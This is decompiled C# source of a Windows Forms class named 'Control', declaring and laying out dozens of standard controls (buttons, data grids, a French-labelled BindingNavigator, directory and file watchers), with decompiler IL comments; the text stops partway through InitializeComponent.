using System;
using System.ComponentModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Control.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Control;

[DesignerGenerated]
public class Control : Form
{
	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox _ComboBox1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("DataGridView1")]
	private DataGridView _DataGridView1;

	[AccessedThroughProperty("ErrorProvider1")]
	private ErrorProvider _ErrorProvider1;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("HScrollBar1")]
	private HScrollBar _HScrollBar1;

	[AccessedThroughProperty("EventLog1")]
	private EventLog _EventLog1;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("DateTimePicker1")]
	private DateTimePicker _DateTimePicker1;

	[AccessedThroughProperty("ColorDialog1")]
	private ColorDialog _ColorDialog1;

	[AccessedThroughProperty("TabControl1")]
	private TabControl _TabControl1;

	[AccessedThroughProperty("TabPage1")]
	private TabPage _TabPage1;

	[AccessedThroughProperty("SplitContainer1")]
	private SplitContainer _SplitContainer1;

	[AccessedThroughProperty("PropertyGrid1")]
	private PropertyGrid _PropertyGrid1;

	[AccessedThroughProperty("TabPage2")]
	private TabPage _TabPage2;

	[AccessedThroughProperty("MonthCalendar1")]
	private MonthCalendar _MonthCalendar1;

	[AccessedThroughProperty("DomainUpDown1")]
	private DomainUpDown _DomainUpDown1;

	[AccessedThroughProperty("DateTimePicker2")]
	private DateTimePicker _DateTimePicker2;

	[AccessedThroughProperty("DataGridView2")]
	private DataGridView _DataGridView2;

	[AccessedThroughProperty("ComboBox2")]
	private ComboBox _ComboBox2;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("BindingNavigator1")]
	private BindingNavigator _BindingNavigator1;

	[AccessedThroughProperty("BindingNavigatorAddNewItem")]
	private ToolStripButton _BindingNavigatorAddNewItem;

	[AccessedThroughProperty("BindingNavigatorCountItem")]
	private ToolStripLabel _BindingNavigatorCountItem;

	[AccessedThroughProperty("BindingNavigatorDeleteItem")]
	private ToolStripButton _BindingNavigatorDeleteItem;

	[AccessedThroughProperty("BindingNavigatorMoveFirstItem")]
	private ToolStripButton _BindingNavigatorMoveFirstItem;

	[AccessedThroughProperty("BindingNavigatorMovePreviousItem")]
	private ToolStripButton _BindingNavigatorMovePreviousItem;

	[AccessedThroughProperty("BindingNavigatorSeparator")]
	private ToolStripSeparator _BindingNavigatorSeparator;

	[AccessedThroughProperty("BindingNavigatorPositionItem")]
	private ToolStripTextBox _BindingNavigatorPositionItem;

	[AccessedThroughProperty("BindingNavigatorSeparator1")]
	private ToolStripSeparator _BindingNavigatorSeparator1;

	[AccessedThroughProperty("BindingNavigatorMoveNextItem")]
	private ToolStripButton _BindingNavigatorMoveNextItem;

	[AccessedThroughProperty("BindingNavigatorMoveLastItem")]
	private ToolStripButton _BindingNavigatorMoveLastItem;

	[AccessedThroughProperty("BindingNavigatorSeparator2")]
	private ToolStripSeparator _BindingNavigatorSeparator2;

	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker _BackgroundWorker1;

	[AccessedThroughProperty("BackgroundWorker2")]
	private BackgroundWorker _BackgroundWorker2;

	[AccessedThroughProperty("BindingSource1")]
	private BindingSource _BindingSource1;

	[AccessedThroughProperty("ColorDialog2")]
	private ColorDialog _ColorDialog2;

	[AccessedThroughProperty("ContextMenuStrip1")]
	private ContextMenuStrip _ContextMenuStrip1;

	[AccessedThroughProperty("DirectoryEntry1")]
	private DirectoryEntry _DirectoryEntry1;

	[AccessedThroughProperty("DirectorySearcher1")]
	private DirectorySearcher _DirectorySearcher1;

	[AccessedThroughProperty("FileSystemWatcher1")]
	private FileSystemWatcher _FileSystemWatcher1;

	[AccessedThroughProperty("FolderBrowserDialog1")]
	private FolderBrowserDialog _FolderBrowserDialog1;

	[AccessedThroughProperty("FontDialog1")]
	private FontDialog _FontDialog1;

	[AccessedThroughProperty("OpenFileDialog1")]
	private OpenFileDialog _OpenFileDialog1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual ComboBox ComboBox1
	{
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ComboBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = CheckBox1_CheckedChanged;
			if (_CheckBox1 != null)
			{
				_CheckBox1.remove_CheckedChanged(eventHandler);
			}
			_CheckBox1 = value;
			if (_CheckBox1 != null)
			{
				_CheckBox1.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual DataGridView DataGridView1
	{
		get
		{
			return _DataGridView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DataGridView1 = value;
		}
	}

	internal virtual ErrorProvider ErrorProvider1
	{
		get
		{
			return _ErrorProvider1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ErrorProvider1 = value;
		}
	}

	internal virtual GroupBox GroupBox1
	{
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = GroupBox1_Enter;
			if (_GroupBox1 != null)
			{
				((Control)_GroupBox1).remove_Enter(eventHandler);
			}
			_GroupBox1 = value;
			if (_GroupBox1 != null)
			{
				((Control)_GroupBox1).add_Enter(eventHandler);
			}
		}
	}

	internal virtual HScrollBar HScrollBar1
	{
		get
		{
			return _HScrollBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			ScrollEventHandler val = new ScrollEventHandler(HScrollBar1_Scroll);
			if (_HScrollBar1 != null)
			{
				((ScrollBar)_HScrollBar1).remove_Scroll(val);
			}
			_HScrollBar1 = value;
			if (_HScrollBar1 != null)
			{
				((ScrollBar)_HScrollBar1).add_Scroll(val);
			}
		}
	}

	internal virtual EventLog EventLog1
	{
		get
		{
			return _EventLog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_EventLog1 = value;
		}
	}

	internal virtual ImageList ImageList1
	{
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual DateTimePicker DateTimePicker1
	{
		get
		{
			return _DateTimePicker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = DateTimePicker1_ValueChanged;
			if (_DateTimePicker1 != null)
			{
				_DateTimePicker1.remove_ValueChanged(eventHandler);
			}
			_DateTimePicker1 = value;
			if (_DateTimePicker1 != null)
			{
				_DateTimePicker1.add_ValueChanged(eventHandler);
			}
		}
	}

	internal virtual ColorDialog ColorDialog1
	{
		get
		{
			return _ColorDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ColorDialog1 = value;
		}
	}

	internal virtual TabControl TabControl1
	{
		get
		{
			return _TabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TabControl1 = value;
		}
	}

	internal virtual TabPage TabPage1
	{
		get
		{
			return _TabPage1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TabPage1 = value;
		}
	}

	internal virtual SplitContainer SplitContainer1
	{
		get
		{
			return _SplitContainer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_SplitContainer1 = value;
		}
	}

	internal virtual PropertyGrid PropertyGrid1
	{
		get
		{
			return _PropertyGrid1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PropertyGrid1 = value;
		}
	}

	internal virtual TabPage TabPage2
	{
		get
		{
			return _TabPage2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TabPage2 = value;
		}
	}

	internal virtual MonthCalendar MonthCalendar1
	{
		get
		{
			return _MonthCalendar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_MonthCalendar1 = value;
		}
	}

	internal virtual DomainUpDown DomainUpDown1
	{
		get
		{
			return _DomainUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DomainUpDown1 = value;
		}
	}

	internal virtual DateTimePicker DateTimePicker2
	{
		get
		{
			return _DateTimePicker2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DateTimePicker2 = value;
		}
	}

	internal virtual DataGridView DataGridView2
	{
		get
		{
			return _DataGridView2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DataGridView2 = value;
		}
	}

	internal virtual ComboBox ComboBox2
	{
		get
		{
			return _ComboBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ComboBox2 = value;
		}
	}

	internal virtual CheckBox CheckBox2
	{
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox2 = value;
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual BindingNavigator BindingNavigator1
	{
		get
		{
			return _BindingNavigator1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigator1 = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorAddNewItem
	{
		get
		{
			return _BindingNavigatorAddNewItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorAddNewItem = value;
		}
	}

	internal virtual ToolStripLabel BindingNavigatorCountItem
	{
		get
		{
			return _BindingNavigatorCountItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorCountItem = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorDeleteItem
	{
		get
		{
			return _BindingNavigatorDeleteItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorDeleteItem = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorMoveFirstItem
	{
		get
		{
			return _BindingNavigatorMoveFirstItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorMoveFirstItem = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorMovePreviousItem
	{
		get
		{
			return _BindingNavigatorMovePreviousItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorMovePreviousItem = value;
		}
	}

	internal virtual ToolStripSeparator BindingNavigatorSeparator
	{
		get
		{
			return _BindingNavigatorSeparator;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorSeparator = value;
		}
	}

	internal virtual ToolStripTextBox BindingNavigatorPositionItem
	{
		get
		{
			return _BindingNavigatorPositionItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorPositionItem = value;
		}
	}

	internal virtual ToolStripSeparator BindingNavigatorSeparator1
	{
		get
		{
			return _BindingNavigatorSeparator1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorSeparator1 = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorMoveNextItem
	{
		get
		{
			return _BindingNavigatorMoveNextItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorMoveNextItem = value;
		}
	}

	internal virtual ToolStripButton BindingNavigatorMoveLastItem
	{
		get
		{
			return _BindingNavigatorMoveLastItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorMoveLastItem = value;
		}
	}

	internal virtual ToolStripSeparator BindingNavigatorSeparator2
	{
		get
		{
			return _BindingNavigatorSeparator2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingNavigatorSeparator2 = value;
		}
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BackgroundWorker1 = value;
		}
	}

	internal virtual BackgroundWorker BackgroundWorker2
	{
		get
		{
			return _BackgroundWorker2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BackgroundWorker2 = value;
		}
	}

	internal virtual BindingSource BindingSource1
	{
		get
		{
			return _BindingSource1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_BindingSource1 = value;
		}
	}

	internal virtual ColorDialog ColorDialog2
	{
		get
		{
			return _ColorDialog2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ColorDialog2 = value;
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip1
	{
		get
		{
			return _ContextMenuStrip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ContextMenuStrip1 = value;
		}
	}

	internal virtual DirectoryEntry DirectoryEntry1
	{
		get
		{
			return _DirectoryEntry1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DirectoryEntry1 = value;
		}
	}

	internal virtual DirectorySearcher DirectorySearcher1
	{
		get
		{
			return _DirectorySearcher1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_DirectorySearcher1 = value;
		}
	}

	internal virtual FileSystemWatcher FileSystemWatcher1
	{
		get
		{
			return _FileSystemWatcher1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_FileSystemWatcher1 = value;
		}
	}

	internal virtual FolderBrowserDialog FolderBrowserDialog1
	{
		get
		{
			return _FolderBrowserDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_FolderBrowserDialog1 = value;
		}
	}

	internal virtual FontDialog FontDialog1
	{
		get
		{
			return _FontDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_FontDialog1 = value;
		}
	}

	internal virtual OpenFileDialog OpenFileDialog1
	{
		get
		{
			return _OpenFileDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_OpenFileDialog1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Timer1 = value;
		}
	}

	public Control()
	{
		((Form)this).add_Load((EventHandler)delegate
		{
			CheckIt();
		});
		((Form)this).add_Load((EventHandler)CheckIt);
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.Forms.Control);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Expected O, but got Unknown
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got Unknown
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Expected O, but got Unknown
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_018e: Expected O, but got Unknown
		//IL_018f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0199: Expected O, but got Unknown
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Expected O, but got Unknown
		//IL_01a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Expected O, but got Unknown
		//IL_01b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ba: Expected O, but got Unknown
		//IL_01bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c5: Expected O, but got Unknown
		//IL_01d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01db: Expected O, but got Unknown
		//IL_01dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e6: Expected O, but got Unknown
		//IL_01e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f1: Expected O, but got Unknown
		//IL_01f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fc: Expected O, but got Unknown
		//IL_0203: Unknown result type (might be due to invalid IL or missing references)
		//IL_020d: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0218: Expected O, but got Unknown
		//IL_0219: Unknown result type (might be due to invalid IL or missing references)
		//IL_0223: Expected O, but got Unknown
		//IL_0224: Unknown result type (might be due to invalid IL or missing references)
		//IL_022e: Expected O, but got Unknown
		//IL_022f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0239: Expected O, but got Unknown
		//IL_023a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0244: Expected O, but got Unknown
		//IL_075f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0769: Expected O, but got Unknown
		//IL_07ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d4: Expected O, but got Unknown
		//IL_092f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0939: Expected O, but got Unknown
		//IL_099a: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a4: Expected O, but got Unknown
		//IL_0a2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a36: Expected O, but got Unknown
		//IL_0a97: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa1: Expected O, but got Unknown
		//IL_0ea4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f22: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Control));
		Button1 = new Button();
		ComboBox1 = new ComboBox();
		CheckBox1 = new CheckBox();
		DataGridView1 = new DataGridView();
		ErrorProvider1 = new ErrorProvider(components);
		EventLog1 = new EventLog();
		GroupBox1 = new GroupBox();
		HScrollBar1 = new HScrollBar();
		ImageList1 = new ImageList(components);
		ColorDialog1 = new ColorDialog();
		DateTimePicker1 = new DateTimePicker();
		BackgroundWorker1 = new BackgroundWorker();
		BindingNavigator1 = new BindingNavigator(components);
		BindingNavigatorMoveFirstItem = new ToolStripButton();
		BindingNavigatorMovePreviousItem = new ToolStripButton();
		BindingNavigatorSeparator = new ToolStripSeparator();
		BindingNavigatorPositionItem = new ToolStripTextBox();
		BindingNavigatorCountItem = new ToolStripLabel();
		BindingNavigatorSeparator1 = new ToolStripSeparator();
		BindingNavigatorMoveNextItem = new ToolStripButton();
		BindingNavigatorMoveLastItem = new ToolStripButton();
		BindingNavigatorSeparator2 = new ToolStripSeparator();
		BindingNavigatorAddNewItem = new ToolStripButton();
		BindingNavigatorDeleteItem = new ToolStripButton();
		BackgroundWorker2 = new BackgroundWorker();
		BindingSource1 = new BindingSource(components);
		Button2 = new Button();
		CheckBox2 = new CheckBox();
		ColorDialog2 = new ColorDialog();
		ComboBox2 = new ComboBox();
		ContextMenuStrip1 = new ContextMenuStrip(components);
		DataGridView2 = new DataGridView();
		DateTimePicker2 = new DateTimePicker();
		DirectoryEntry1 = new DirectoryEntry();
		DirectorySearcher1 = new DirectorySearcher();
		DomainUpDown1 = new DomainUpDown();
		FileSystemWatcher1 = new FileSystemWatcher();
		FolderBrowserDialog1 = new FolderBrowserDialog();
		FontDialog1 = new FontDialog();
		OpenFileDialog1 = new OpenFileDialog();
		MonthCalendar1 = new MonthCalendar();
		Timer1 = new Timer(components);
		TabControl1 = new TabControl();
		TabPage1 = new TabPage();
		TabPage2 = new TabPage();
		SplitContainer1 = new SplitContainer();
		PropertyGrid1 = new PropertyGrid();
		((ISupportInitialize)DataGridView1).BeginInit();
		((ISupportInitialize)ErrorProvider1).BeginInit();
		((ISupportInitialize)EventLog1).BeginInit();
		((Control)GroupBox1).SuspendLayout();
		((ISupportInitialize)BindingNavigator1).BeginInit();
		((Control)BindingNavigator1).SuspendLayout();
		((ISupportInitialize)BindingSource1).BeginInit();
		((ISupportInitialize)DataGridView2).BeginInit();
		((ISupportInitialize)FileSystemWatcher1).BeginInit();
		((Control)TabControl1).SuspendLayout();
		((Control)TabPage1).SuspendLayout();
		((Control)SplitContainer1.get_Panel1()).SuspendLayout();
		((Control)SplitContainer1).SuspendLayout();
		((Control)this).SuspendLayout();
		Button button = Button1;
		Point location = new Point(79, 56);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		Size size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox comboBox = ComboBox1;
		location = new Point(90, 189);
		((Control)comboBox).set_Location(location);
		((Control)ComboBox1).set_Name("ComboBox1");
		ComboBox comboBox2 = ComboBox1;
		size = new Size(121, 21);
		((Control)comboBox2).set_Size(size);
		((Control)ComboBox1).set_TabIndex(2);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(51, 126);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(3);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		DataGridView dataGridView = DataGridView1;
		location = new Point(0, 160);
		((Control)dataGridView).set_Location(location);
		((Control)DataGridView1).set_Name("DataGridView1");
		DataGridView dataGridView2 = DataGridView1;
		size = new Size(240, 150);
		((Control)dataGridView2).set_Size(size);
		((Control)DataGridView1).set_TabIndex(4);
		ErrorProvider1.set_ContainerControl((ContainerControl)(object)this);
		EventLog1.set_SynchronizingObject((ISynchronizeInvoke)this);
		((Control)GroupBox1).get_Controls().Add((Control)(object)HScrollBar1);
		GroupBox groupBox = GroupBox1;
		location = new Point(0, 0);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		size = new Size(200, 100);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(5);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("GroupBox1");
		HScrollBar hScrollBar = HScrollBar1;
		location = new Point(3, 16);
		((Control)hScrollBar).set_Location(location);
		((Control)HScrollBar1).set_Name("HScrollBar1");
		HScrollBar hScrollBar2 = HScrollBar1;
		size = new Size(80, 17);
		((Control)hScrollBar2).set_Size(size);
		((Control)HScrollBar1).set_TabIndex(0);
		ImageList1.set_ColorDepth((ColorDepth)8);
		ImageList imageList = ImageList1;
		size = new Size(16, 16);
		imageList.set_ImageSize(size);
		ImageList1.set_TransparentColor(Color.Transparent);
		DateTimePicker dateTimePicker = DateTimePicker1;
		location = new Point(90, 106);
		((Control)dateTimePicker).set_Location(location);
		((Control)DateTimePicker1).set_Name("DateTimePicker1");
		DateTimePicker dateTimePicker2 = DateTimePicker1;
		size = new Size(200, 20);
		((Control)dateTimePicker2).set_Size(size);
		((Control)DateTimePicker1).set_TabIndex(6);
		BindingNavigator1.set_AddNewItem((ToolStripItem)(object)BindingNavigatorAddNewItem);
		BindingNavigator1.set_CountItem((ToolStripItem)(object)BindingNavigatorCountItem);
		BindingNavigator1.set_DeleteItem((ToolStripItem)(object)BindingNavigatorDeleteItem);
		((ToolStrip)BindingNavigator1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[11]
		{
			(ToolStripItem)BindingNavigatorMoveFirstItem,
			(ToolStripItem)BindingNavigatorMovePreviousItem,
			(ToolStripItem)BindingNavigatorSeparator,
			(ToolStripItem)BindingNavigatorPositionItem,
			(ToolStripItem)BindingNavigatorCountItem,
			(ToolStripItem)BindingNavigatorSeparator1,
			(ToolStripItem)BindingNavigatorMoveNextItem,
			(ToolStripItem)BindingNavigatorMoveLastItem,
			(ToolStripItem)BindingNavigatorSeparator2,
			(ToolStripItem)BindingNavigatorAddNewItem,
			(ToolStripItem)BindingNavigatorDeleteItem
		});
		BindingNavigator bindingNavigator = BindingNavigator1;
		location = new Point(0, 0);
		((Control)bindingNavigator).set_Location(location);
		BindingNavigator1.set_MoveFirstItem((ToolStripItem)(object)BindingNavigatorMoveFirstItem);
		BindingNavigator1.set_MoveLastItem((ToolStripItem)(object)BindingNavigatorMoveLastItem);
		BindingNavigator1.set_MoveNextItem((ToolStripItem)(object)BindingNavigatorMoveNextItem);
		BindingNavigator1.set_MovePreviousItem((ToolStripItem)(object)BindingNavigatorMovePreviousItem);
		((Control)BindingNavigator1).set_Name("BindingNavigator1");
		BindingNavigator1.set_PositionItem((ToolStripItem)(object)BindingNavigatorPositionItem);
		BindingNavigator bindingNavigator2 = BindingNavigator1;
		size = new Size(284, 25);
		((Control)bindingNavigator2).set_Size(size);
		((Control)BindingNavigator1).set_TabIndex(7);
		((Control)BindingNavigator1).set_Text("BindingNavigator1");
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMoveFirstItem.Image"));
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_Name("BindingNavigatorMoveFirstItem");
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorMoveFirstItem = BindingNavigatorMoveFirstItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorMoveFirstItem).set_Size(size);
		((ToolStripItem)BindingNavigatorMoveFirstItem).set_Text("Placer en premier");
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_DisplayStyle((ToolStripItemDisplayStyle)2);
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_Image((Image)componentResourceManager.GetObject("BindingNavigatorMovePreviousItem.Image"));
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_Name("BindingNavigatorMovePreviousItem");
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_RightToLeftAutoMirrorImage(true);
		ToolStripButton bindingNavigatorMovePreviousItem = BindingNavigatorMovePreviousItem;
		size = new Size(23, 22);
		((ToolStripItem)bindingNavigatorMovePreviousItem).set_Size(size);
		((ToolStripItem)BindingNavigatorMovePreviousItem).set_Text("Déplacer vers le haut");
